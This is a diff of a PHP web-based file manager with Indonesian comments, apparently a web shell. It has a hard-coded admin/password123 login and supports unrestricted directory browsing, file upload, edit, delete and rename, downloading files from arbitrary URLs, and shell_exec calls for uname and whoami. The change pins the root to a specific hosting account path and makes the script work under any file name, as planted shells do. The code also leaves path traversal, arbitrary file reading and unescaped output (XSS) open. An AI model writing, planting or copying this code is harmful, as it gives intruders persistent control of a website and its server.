@@ -6,7 +6,7 @@ $valid_username = 'admin';
 $valid_password = 'password123'; // Ganti dengan password yang lebih aman
 
 // Tentukan direktori upload menggunakan getcwd() (current working directory)
-$upload_dir = getcwd();  // Menggunakan direktori saat ini sebagai direktori upload
+$upload_dir = '/home/igxtkemp/live.hijrahfm.com';  // Tentukan root folder di sini
 
 // Cek apakah pengguna sudah login
 if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
@@ -18,7 +18,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         if ($username == $valid_username && $password == $valid_password) {
             $_SESSION['logged_in'] = true;
             $_SESSION['username'] = $username;
-            header("Location: filemanager.php"); // Redirect setelah login
+            header("Location: " . $_SERVER['PHP_SELF']); // Redirect setelah login
             exit();
         } else {
             $error_message = 'Invalid username or password!';
@@ -26,27 +26,16 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
     }
 } else {
     // Fungsi untuk menampilkan daftar file di direktori
-    function list_files($dir, $search = '') {
+    function list_files($dir) {
         $files = scandir($dir);
         $filtered_files = array_diff($files, array('.', '..'));
-
-        if ($search) {
-            $filtered_files = array_filter($filtered_files, function($file) use ($search) {
-                return strpos($file, $search) !== false;
-            });
-        }
-
         return $filtered_files;
     }
 
-    // Menyimpan direktori saat ini
+    // Mendapatkan direktori saat ini dari URL
     $current_dir = isset($_GET['dir']) ? $_GET['dir'] : $upload_dir;
-    $search = isset($_GET['search']) ? $_GET['search'] : '';
 
-    // Mendapatkan daftar file di direktori yang dituju
-    $files = list_files($current_dir, $search);
-
-    // Upload file jika ada form yang disubmit
+    // Menangani form upload file
     if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file_to_upload'])) {
         $file_name = $_FILES['file_to_upload']['name'];
         $file_tmp = $_FILES['file_to_upload']['tmp_name'];
@@ -57,7 +46,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         } else {
             $message = "Failed to upload file.";
         }
-        header("Location: filemanager.php?dir=" . urlencode($current_dir));
+        header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
     }
 
     // Mengedit file jika ada form yang disubmit
@@ -74,7 +63,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         // Simpan perubahan
         file_put_contents($file_path, $_POST['content']);
         $message = "File updated successfully!";
-        header("Location: filemanager.php?dir=" . urlencode($current_dir));
+        header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
     }
 
     // Menghapus file jika diminta
@@ -84,7 +73,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
             unlink($file_to_delete);
             $message = "File deleted successfully!";
         }
-        header("Location: filemanager.php?dir=" . urlencode($current_dir));
+        header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
     }
 
     // Mengunduh file dari URL lain
@@ -100,7 +89,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         } else {
             $message = "Failed to download file from URL.";
         }
-        header("Location: filemanager.php?dir=" . urlencode($current_dir));
+        header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
     }
 
     // Rename file jika diminta
@@ -115,7 +104,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         } else {
             $message = "Failed to rename file.";
         }
-        header("Location: filemanager.php?dir=" . urlencode($current_dir));
+        header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir));
     }
 }
 ?>
@@ -162,7 +151,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         <!-- Form Login -->
         <div class="login-form">
             <h2>Login</h2>
-            <form action="filemanager.php" method="POST">
+            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
                 <input type="text" name="username" placeholder="Username" required><br><br>
                 <input type="password" name="password" placeholder="Password" required><br><br>
                 <button type="submit">Login</button>
@@ -175,7 +164,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         <!-- Form Upload -->
         <div class="upload-form">
             <h2>Upload File</h2>
-            <form action="filemanager.php?dir=<?php echo urlencode($current_dir); ?>" method="POST" enctype="multipart/form-data">
+            <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST" enctype="multipart/form-data">
                 <input type="file" name="file_to_upload" required><br><br>
                 <button type="submit">Upload</button>
             </form>
@@ -186,7 +175,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
             <h2>Files in Directory: <?php echo $current_dir; ?></h2>
 
             <form class="search-form" method="GET">
-                <input type="text" name="search" value="<?php echo $search; ?>" placeholder="Search...">
+                <input type="text" name="search" value="<?php echo isset($_GET['search']) ? $_GET['search'] : ''; ?>" placeholder="Search...">
                 <button type="submit">Search</button>
             </form>
 
@@ -198,20 +187,23 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
                     </tr>
                 </thead>
                 <tbody>
-                    <?php foreach ($files as $file): ?>
+                    <?php
+                    $files = list_files($current_dir);
+                    foreach ($files as $file):
+                    ?>
                         <tr>
                             <td>
                                 <?php if (is_dir($current_dir . '/' . $file)): ?>
                                     <!-- Link ke direktori yang dapat diklik -->
-                                    <a href="filemanager.php?dir=<?php echo urlencode($current_dir . '/' . $file); ?>" class="directory-link"><?php echo $file; ?></a>
+                                    <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir . '/' . $file); ?>" class="directory-link"><?php echo $file; ?></a>
                                 <?php else: ?>
                                     <?php echo $file; ?>
                                 <?php endif; ?>
                             </td>
                             <td>
-                                <a href="filemanager.php?delete_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Delete</a>
-                                <a href="filemanager.php?dir=<?php echo urlencode($current_dir); ?>&edit_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Edit</a>
-                                <a href="filemanager.php?dir=<?php echo urlencode($current_dir); ?>&rename_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Rename</a>
+                                <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>&delete_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Delete</a>
+                                <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>&edit_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Edit</a>
+                                <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>&rename_file=<?php echo urlencode($current_dir . '/' . $file); ?>">Rename</a>
                             </td>
                         </tr>
                     <?php endforeach; ?>
@@ -223,7 +215,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         <div class="edit-form">
             <h2>Rename File</h2>
             <?php if (isset($_GET['rename_file'])): ?>
-                <form action="filemanager.php?dir=<?php echo urlencode($current_dir); ?>" method="POST">
+                <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST">
                     <input type="hidden" name="rename_file" value="<?php echo $_GET['rename_file']; ?>">
                     <input type="text" name="new_name" placeholder="New file name" required><br><br>
                     <button type="submit">Rename</button>
@@ -235,7 +227,7 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
         <div class="edit-form">
             <h2>Edit File</h2>
             <?php if (isset($_GET['edit_file'])): ?>
-                <form action="filemanager.php?dir=<?php echo urlencode($current_dir); ?>" method="POST">
+                <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST">
                     <input type="hidden" name="edit_file" value="<?php echo $_GET['edit_file']; ?>">
                     <textarea name="content" placeholder="Edit your file content here..."><?php echo file_get_contents($_GET['edit_file']); ?></textarea><br><br>
                     <button type="submit">Save Changes</button>
@@ -243,26 +235,23 @@ if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
             <?php endif; ?>
         </div>
 
-        <!-- Download File from URL -->
+        <!-- Download from URL -->
         <div class="url-form">
-            <h2>Download File from URL</h2>
-            <form action="filemanager.php" method="POST">
+            <h2>Download from URL</h2>
+            <form action="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>" method="POST">
                 <input type="text" name="url" placeholder="Enter URL" required><br><br>
-                <input type="text" name="filename" placeholder="Enter file name" required><br><br>
+                <input type="text" name="filename" placeholder="Save as filename" required><br><br>
                 <button type="submit" name="download_from_url">Download</button>
             </form>
         </div>
 
-        <!-- Info Server -->
+        <!-- Server Info -->
         <div class="info">
             <h2>Server Information</h2>
-            <p><strong>Server Name:</strong> <?php echo gethostname(); ?></p>
-            <p><strong>Server Host:</strong> <?php echo $_SERVER['SERVER_NAME']; ?></p>
-            <p><strong>System Info:</strong> <?php echo shell_exec('uname -a'); ?></p>
-            <p><strong>User Info:</strong> <?php echo shell_exec('whoami'); ?></p>
-            <p><strong>User IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
+            <p><strong>System Info (uname -a): </strong> <?php echo shell_exec('uname -a'); ?></p>
+            <p><strong>User Info (whoami): </strong> <?php echo shell_exec('whoami'); ?></p>
+            <p><strong>IP Address: </strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
         </div>
-
     <?php endif; ?>
 </div>
 
